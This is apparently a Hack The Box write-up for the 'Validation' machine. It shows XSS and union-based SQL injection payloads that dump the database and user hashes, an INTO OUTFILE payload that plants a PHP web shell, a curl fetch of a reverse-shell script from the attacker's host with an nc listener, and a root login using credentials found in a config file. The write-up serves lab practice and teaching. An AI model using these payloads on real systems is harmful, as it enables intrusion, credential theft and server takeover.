# Validation HacktheBox

**DEMO**

https://youtu.be/f8WEvvKZM8s

**ENUMERATION**

**NMAP**

![image](https://user-images.githubusercontent.com/79543461/177142512-ca4b0e81-c4bd-4cae-a65e-6dc6976a7242.png)

**Port 80**

![image](https://user-images.githubusercontent.com/79543461/177142701-0be496f1-60ba-4fed-871d-836ca8352fb7.png)

**Port 4566**

![image](https://user-images.githubusercontent.com/79543461/177142777-127ce58a-10c2-4d35-99cd-904be4e79abd.png)

**Port 8080**

![image](https://user-images.githubusercontent.com/79543461/177142844-5600bb65-4f47-4ae9-8d4c-e20eaca2a966.png)

I enumerate Port 80:

![image](https://user-images.githubusercontent.com/79543461/177143065-83faf0c0-e186-40e3-aac5-4011e709f972.png)

**First Attack Vectors**

The index page of this web it's a form to qualify for something called September UHC, let's try to inject code SQL,XSS,HTML and more.

**XSS**

Payload: <script>alert("SS")</script>

![image](https://user-images.githubusercontent.com/79543461/177160817-3203a467-57bd-4bb6-ab4a-50d45508fc1c.png)

**It's Vulnerable to XSS and HTML Injection, but i can't do anything**

**SQLI**

**BurpSuite**

Payload: ' order by 10000-- - == **NO WORK**

Payload: ' union select 1-- - == **NO WORK**

**Country Field**

Let's try to do this payloads with other field from request.

Payload: ' union select 1-- - == **WORKS!!!!!**

![image](https://user-images.githubusercontent.com/79543461/177161840-7352bb95-c77b-451d-9b9f-8d3d785baed2.png)

![image](https://user-images.githubusercontent.com/79543461/177162100-a0e026a4-6b8d-4f35-b056-161b90c9238e.png)

Let's go to enumerate Things.

**Database**

Payload: ' union select database()-- -

![image](https://user-images.githubusercontent.com/79543461/177163576-b903824d-3109-4143-b421-39d210096c0e.png)

**Version**

Payload: ' union select @@version-- -

![image](https://user-images.githubusercontent.com/79543461/177164063-41a93070-b0fc-4cfc-8592-f87ac3f97f96.png)

**All DataBases**

Payload: ' union select schema_name from information_schema.schemata

![image](https://user-images.githubusercontent.com/79543461/177171212-3efc9aa0-4291-4807-abf9-66885bfe0a08.png)

**Tables Registration Database**

Payload: ' union select table_name from information_schema.tables where table_schema="registration"-- -

![image](https://user-images.githubusercontent.com/79543461/177171583-48dca75b-e3f3-4a55-a860-3d5297fb0f45.png)

Table name is the same than DataBase Name

**Columns**

Payload: ' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -

![image](https://user-images.githubusercontent.com/79543461/177172114-948b0c56-5358-47d9-8328-fec1366e3086.png)

**Users and Passwords**

Payload: ' union select group_concat(username,0x3a,userhash) from registration-- -

![image](https://user-images.githubusercontent.com/79543461/177172762-289b5e1f-248c-4e39-994f-d6fd8a30c4ff.png)

This users are my users...

**RCE**

Payload: ' union select "**<?php system($_REQUEST['cmd']);?>**" into outfile "/var/www/html/rce.php"-- -

**Works!!**

![image](https://user-images.githubusercontent.com/79543461/177177136-7d1b27fa-3f5e-420b-9fb2-e048e02d502a.png)

**Reverse Shell**

I create in my Kali Machine a php script to gain reverse shell.

I open http server wirth python3: python3 -m http.server

In victim RCE: curl -o shell.php 10.10.14.33:8000/shell.php

Now i put rlwrap nc -lnvp 1212

I access to:  http://10.10.11.116/shell.php

**I HAVE SHELL!!**

![image](https://user-images.githubusercontent.com/79543461/177179263-e41c28fb-324e-4e7d-926b-8e39c4548d11.png)

**user.txt**

![image](https://user-images.githubusercontent.com/79543461/177180144-1d77396f-ef0f-468b-95cb-6a7bc2c9e3a7.png)

**Docker Container**

![image](https://user-images.githubusercontent.com/79543461/177180507-f5f4daf5-7dd3-46d8-b3ca-80eb00577e6e.png)

Im in docker container but i found a credentials in /var/www/html/config.php

![image](https://user-images.githubusercontent.com/79543461/177180745-2ee9c296-3318-4717-ae22-c97fb8fff416.png)

**SSH DON'T WORK**

![image](https://user-images.githubusercontent.com/79543461/177181115-1fc9620d-cb57-48a3-b954-ef3611b19b7d.png)

su root its working

![image](https://user-images.githubusercontent.com/79543461/177182304-06ef859a-1a1e-4191-87cc-2a6e79256819.png)

**DONE :)**

**DEMO**
https://youtu.be/f8WEvvKZM8s

Thanks
